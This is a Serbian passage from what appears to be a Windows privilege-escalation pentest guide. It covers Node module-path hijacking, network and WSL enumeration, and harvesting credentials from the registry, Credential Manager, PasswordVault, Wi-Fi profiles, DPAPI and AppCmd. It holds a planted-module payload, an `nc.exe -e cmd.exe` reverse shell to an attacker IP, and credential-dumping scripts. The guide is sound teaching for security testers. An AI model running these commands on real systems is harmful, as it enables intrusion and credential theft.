Node razrešava pakete tako što se penje kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom roditeljskom direktorijumu. U Windows-u to penjanje može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće lokacije:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo postaje **LPE** kad god se cilj pokreće kao administrator, iz zakazanog zadatka/pomoćne usluge sa povišenim privilegijama ili iz automatski pokrenute privilegovane desktop aplikacije.

Ovo je naročito često kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja sa radom u slučaju greške
- je paket uklonjen iz produkcionih verzija, izostavljen tokom pakovanja ili njegova instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, umesto u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da potvrdite putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE Electron aplikacije ili pomoćni proces)
- Filtrirajte po `Path` `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje u okviru `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte korenski direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Dodajte modul sa tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo primeniti: pronađite bilo koji **nedostajući goli import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i jačanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili upisuje nove `.js` datoteke/pakete u njega.
- Tražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime zavisnosti u pakete i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana i potražite obrasce `try { require("...") } catch {}` koji tiho ignorišu greške.
- Onemogućite opcione provere ako ih biblioteka podržava (na primer, neke `ws` implementacije mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su u hosts datoteci hardkodirani podaci o drugim poznatim računarima.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite da li su **ograničene usluge** dostupne spolja.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao korisnik koji ga pokreće samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je predmet provere: listener i putanja do binarne datoteke samo su pasivni tragovi, dok ruta do memorijske korupcije koja zahteva autentifikaciju zahteva analizu te konkretne binarne datoteke i ulaza koji su joj dostupni. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite kojoj pozadinskoj usluzi pripada; samo pravilo prosleđivanja ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**

Još[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete da osluškujete na bilo kom portu (prvi put kada upotrebite `nc.exe` za osluškivanje na portu, grafički interfejs će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite WSL sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windows-u. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, proverite datoteke istorije shell-a (uključujući `/root/.bash_history`) da biste pronašli komande u kojima su možda zabeleženi akreditivi; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen put za autentifikaciju. Raspored `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično skladišti distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), zato prvo utvrdite stvarnu distribuciju i putanju skladišta. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog prikupljanja podataka.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne akreditive. Vrednost koja nije prazna za `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz lozinke u otvorenom tekstu u registru. Ako je `AutoAdminLogon=1`, ali nijedna lozinka u otvorenom tekstu nije čitljiva, to je samo smernica za dalju proveru: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne utvrđuje da li ta tajna postoji niti da li se može preuzeti. Proverite prava pristupa i stvarnu konfiguraciju prijavljivanja pre nego što prijavite izložene akreditive.

### Credential Manager / Windows Vault

Iz [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, moglo bi se učiniti da korisnici mogu da sačuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može automatski da koristi za prijavljivanje korisnika, što znači da **svaka Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, i da koristi dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa Credential Manager-om i zatraži akreditive za taj resurs** iz podrazumevanog skladišta vault-a.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na mašini.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` da biste koristili sačuvane akreditive. Sledeći primer poziva udaljenu binarnu datoteku preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa datim pristupnim podacima.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modul [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju tokene za autentifikaciju i lozinke u čistom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` (dostupan i kao `Web Credentials` u `vaultcmd`). Ovaj prostor za skladištenje izolovan je po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj korisničkoj sesiji da biste odmah dump-ovali i dešifrovali sva sačuvana korisnička imena i lozinke u čistom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka i pretežno se koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi tajnu korisnika ili sistema kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima šifrovanja sistema, koristi tajne za autentifikaciju domena sistema.

Šifrovani korisnički RSA ključevi, zaštićeni pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, smešten zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može prikazati pomoću komande `dir` u CMD-u, ali može pomoću PowerShell-a.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz modul** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste je dešifrovali.

**Datoteke sa kredencijalima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kom su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju `.xml`. Kada skripta ili inventar datoteka ukažu na njega, utvrdite stvarnu putanju profila naloga umesto da pretpostavite da je `C:\Users`: [Windows može da smesti profile na druga mesta](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je trag; [Windows `Export-Clixml` vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki oporavljeni nalog mora zasebno imati odgovarajuća prava na ciljnoj usluzi. Prvo pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili otvorenih vrednosti tokom uobičajenog popisivanja.

Da biste **dešifrovali** PowerShell akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul **Mimikatz** `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Pomoću modula **Mimikatz** `sekurlsa::dpapi` možete **izvući više DPAPI masterkeys iz memorije**

**mRemoteNG koristi drugačije skladište konekcija.** Pregledajte čitljiv XML u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke sa uobičajenim nazivima kao što je `config.xml`. Utvrdite šemu konekcija i šifrovane atribute `Password` pre nego što XML datoteku smatrate mogućim izvorom akreditiva. Sačuvana vrednost nije DPAPI/RDCMan password; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežnog enumerisanja.

**Remote Desktop Plus profili izvoza** mogu takođe biti čitljivi u korisničkim fasciklama ili zajedničkoj administrativnoj fascikli. Nasleđeni izvoz `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Tretirajte neprazan element za lozinku kao mogući izvor akreditiva, nemojte ga ispisivati niti pretpostavljati da je u čistom tekstu: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili da može biti slabije konfigurisana. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi često koriste aplikaciju StickyNotes na Windows radnim stanicama da bi **sačuvali lozinke** i druge informacije, ne shvatajući da je u pitanju datoteka baze podataka. Ova datoteka se nalazi na lokaciji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi potražiti je i pregledati.

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na lokaciji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladištenja koristi pre nego što odsustvo SQLite datoteke protumačite kao dokaz da nema beleški.

Ako Sticky Notes koristi SQLite zapisivanje unapred (WAL), kopija same datoteke `plum.sqlite` može izostaviti nedavne potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz konzistentnu kopiju baze podataka i uključite `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju za WAL](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je mogući izvor akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Šifrovani zapis iz password managera zahteva i odgovarajući ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi mogao da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte u vidu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga sa nivoom integriteta High.**\
**AppCmd.exe** se nalazi u fascikli `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **akreditivi** koji se mogu **oporaviti**.

Ovaj kod je preuzet iz projekta [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li postoji `C:\Windows\CCM\SCClient.exe` .\
Instalacioni programi se **pokreću sa SYSTEM privilegijama**, mnogi su podložni **DLL Sideloading-u (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i Registry (akreditivi)

### Artefakti akreditiva u Registry ključevima alata za podršku

Neke starije instalacije alata za udaljenu podršku zadržavaju nazive vrednosti povezane s lozinkama u fiksnim ključevima Registry-ja aplikacije. Na primer, prema [objašnjenju Registry ključa od strane proizvođača](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` u verzijama pre verzije 9 označavao je konfigurisanu statičku lozinku sesije za TeamViewer. Oznaka u nazivu vrednosti samo je smernica za proveru: pre procene tog akreditiva proverite instaliranu verziju, da li su podaci vrednosti čitljivi, njihov format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog zahteva i stvarno ponovno korišćenje lozinke, kao i ovlašćenje za taj nalog. Šifrovani tekst i otkrivene lozinke nemojte prikazivati u uobičajenom izlazu enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista kontroliše uređivanje i nije bezbednosna funkcija; sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene, relevantne datoteke i izbegavajte ispisivanje mogućih tajni tokom široke enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićeni list ili skrivena kolona sami po sebi ne dokazuju da postoje akreditivi niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Zadržane zakrpe izmena na CI serveru

CI server može zadržati poslate izmene izvornog koda u svom direktorijumu sa podacima i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao lokaciju za izmene udaljenih pokretanja; direktorijum sa podacima može da se konfiguriše i nije nužno u okviru `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na datoteku sa akreditivima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell postupak `ConvertTo-SecureString -Key` zahteva AES ključ, kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Prvo pregledajte samo dostupne nazive zakrpa, a zatim, uz ovlašćenje, proverite relevantan sadržaj bez ispisivanja tajni u uobičajenom izlazu enumeracije. Putanja zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju da su akreditivi važeći niti da omogućavaju pristup s višim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene izgradnje.

### Prilagođena rotacija lozinke lokalnog administratora

Domaća alatka za rotaciju lozinki može čuvati šifrovanu lozinku lokalnog administratora u lokalnom servisu, dok akreditive za svoju bazu podataka čuva u čitljivoj datoteci `.env` ili pored binarne datoteke programa za ažuriranje. Zajedno proverite planirani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole baze podataka. Lokalnoj bazi podataka dostupnoj samo preko loopback interfejsa i dalje može pristupiti lokalni korisnik koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da ima dozvolu za čitanje relevantnih zapisa. Ako su seme za šifrovanje ili ključni materijal dostupni pored šifrovanog teksta, proverite tačno izvođenje ključa pre nego što se oslonite na šifrovanje. Šema koja deterministički izvodi AES ključ iz izloženog semena pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije prikladna za zaštitu te lozinke; Go navodi da taj paket nije namenjen za nasumičnost osetljivu na bezbednost. Pre nego što otkrivenu lozinku smatrate putem eskalacije, potvrdite da je aktuelna i da pripada nalogu iz lokalne grupe Administrators. Planirani zadatak, putanja do `.env` datoteke ili šifrovani sadržaj sami po sebi ne dokazuju nijedan od tih uslova. Lozinke i ključni materijal nemojte prikazivati u uobičajenom izlazu enumeracije.

Za upravljane lozinke lokalnih administratora koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Njegovo skladištenje u direktorijumu ili usluzi Entra i kontrole pristupa razlikuju se od prilagođene lokalne baze podataka; [uloge u Elasticsearch-u](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik baze podataka može da čita određeni indeks.

### Arhive Java server dodataka i ponovno korišćenje akreditiva

Neki Java server dodaci distribuiraju se kao JAR arhive u direktorijumu `plugins` servera. Čitljiv prilagođeni dodatak može sadržati konfiguraciju ili bajtkod sa ugrađenim akreditivom servisa. Arhivu pregledajte samo uz ovlašćenje i ne prikazujte otkrivene tajne u uobičajenom izlazu enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a otkrivena lozinka servisa vodi do viših privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo korišćene akreditive zasebnim tajnama. Informacije o rasporedu direktorijuma potražite u [vodiču za instalaciju dodataka za PaperMC](https://docs.papermc.io/paper/adding-plugins/), a o sadržaju arhiva u [Oracle dokumentaciji za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Akreditivi ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može čuvati `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire [dokumentacija za dobavljača korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da se lozinke mogu čuvati u otvorenom tekstu ili šifrovati ključem koji se nalazi u tom svojstvu. Otkrivena lozinka važna je za eskalaciju samo ako i dalje važi za identitet s višim privilegijama; sam naziv datoteke ne dokazuje ni pristup za čitanje ni ponovno korišćenje akreditiva. Putanja je smernica za inventarisanje, zato sadržaj baze podataka i akreditive nemojte prikazivati u uobičajenom izlazu enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može otkriti konfigurisane portove i interfejs vezivanja admin konzole, čak i kada se koristi spoljna baza podataka. Openfire obično vezuje admin konzolu za loopback; lokalni nalog i dalje može da dođe do adrese ako listener radi. Zajedno proverite stvarni listener, ovlašćenu admin ulogu, smernice za otpremanje dodataka i identitet Openfire servisa. Admin koji može da instalira dodatak može da izazove izvršavanje koda dodatka u kontekstu servisa, što može imati visoke privilegije kada servis radi kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup admin konzoli niti izvršavanje koda. Pogledajte [vodič proizvođača za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije Velociraptor servera, koje se obično zovu `server.config.yaml`, mogu sadržati `CA.private_key` internog CA-a. Ako korisnik s nižim privilegijama može da čita taj ključ, možda će moći da izda API klijentski sertifikat. Da li to vodi do viših privilegija zavisi od korisničkih uloga servera, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne dokazuje pristup CA-u servera. Neke instalacije drže privatni CA ključ van mreže, pa čitljiva konfiguracija servera možda uopšte ne sadrži ključ za potpisivanje.

